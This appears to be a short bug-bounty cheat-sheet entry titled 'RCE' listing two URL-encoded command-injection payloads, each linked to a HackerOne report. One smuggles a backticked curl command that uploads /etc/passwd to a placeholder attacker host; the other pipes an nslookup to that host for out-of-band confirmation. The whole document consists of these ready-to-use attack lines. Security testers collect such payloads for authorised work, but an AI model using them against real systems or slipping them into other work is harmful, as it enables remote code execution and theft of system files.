# RCE

```
urlencode(`curl -F"file=@/etc/passwd" YOURSERVER.COM`)  https://hackerone.com/reports/1348154
urlencode(|nslookup -q=cname YOURSERVER.COM)  https://hackerone.com/reports/1360208
```
